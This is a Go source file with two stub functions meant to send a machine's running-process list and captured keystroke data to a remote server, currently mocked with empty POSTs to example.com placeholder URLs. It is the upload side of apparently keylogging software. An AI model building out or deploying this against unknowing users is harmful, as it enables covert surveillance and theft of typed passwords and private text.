package network

import (
	"log"
	"net/http"
)

// SendProcessesToServer sends the process data to a remote server (mocked for now)
func SendProcessesToServer(processes []string) {
	// Simulating REST API call by logging the processes
	for _, proc := range processes {
		log.Printf("Sending process to server: %s", proc)
	}

	// Simulating HTTP POST request
	resp, err := http.Post("https://example.com/api/processes", "application/json", nil)
	if err != nil {
		log.Printf("Failed to send data: %v", err)
	} else {
		defer resp.Body.Close()
		log.Printf("Successfully sent data, status: %s", resp.Status)
	}
}

// SendKeyEventsToServer sends the keyboard typing data to the server (mocked for now)
func SendKeyEventsToServer(keyEvents string) {
	if keyEvents == "" {
		return
	}

	// Log sending to the server (this will later be an API call)
	log.Printf("Sending key events to server: %s\n", keyEvents)

	// Simulating HTTP POST request
	resp, err := http.Post("https://example.com/api/keyboard", "application/json", nil)
	if err != nil {
		log.Printf("Failed to send key event data: %v", err)
	} else {
		defer resp.Body.Close()
		log.Printf("Successfully sent key event data, status: %s", resp.Status)
	}
}
